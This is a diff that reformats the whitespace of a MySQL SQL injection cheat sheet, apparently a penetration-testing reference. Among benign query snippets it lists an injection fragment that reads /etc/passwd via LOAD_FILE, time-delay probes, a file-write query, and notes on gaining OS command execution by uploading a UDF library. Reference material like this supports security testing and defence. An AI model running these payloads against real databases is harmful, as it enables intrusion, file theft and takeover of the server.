@@ -21,7 +21,7 @@ List DBA Accounts		SELECT grantee, privilege_type, is_grantable FROM information
 Current Database		SELECT database()
 
 List Databases			SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
-						SELECT distinct(db) FROM mysql.db — priv
+				SELECT distinct(db) FROM mysql.db — priv
 						
 List Columns			SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema !=‘information_schema’
 
@@ -30,7 +30,7 @@ List Tables			SELECT table_schema,table_name FROM information_schema.tables WHER
 Find Tables From Column Name	SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
 
 Select Nth Row			SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
-						SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
+				SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
 						
 Select Nth Char			SELECT substr(‘abcd’, 3, 1); # returns c
 
@@ -45,7 +45,7 @@ Casting				SELECT cast(‘1’ AS unsigned integer);
 				SELECT cast(‘123’ AS char);
 						
 String Concatenation		SELECT CONCAT(‘A’,’B’); #returns AB
-						SELECT CONCAT(‘A’,’B’,’C’); # returns ABC
+				SELECT CONCAT(‘A’,’B’,’C’); # returns ABC
 						
 If Statement			SELECT if(1=1,’foo’,’bar’); — returns ‘foo’
 
@@ -53,15 +53,15 @@ Case Statement			SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns
 
 Avoiding Quotes			SELECT 0x414243; # returns ABC
 
-Time Delay				SELECT BENCHMARK(1000000,MD5(‘A’));
-						SELECT SLEEP(5); # >= 5.0.12
+Time Delay			SELECT BENCHMARK(1000000,MD5(‘A’));
+				SELECT SLEEP(5); # >= 5.0.12
 						
 Make DNS Requests		Impossible?
 
 Command Execution		If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
 
 Local File Access		…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.
-						SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system
+				SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system
 						
 Hostname, IP Address		SELECT @@hostname;
 
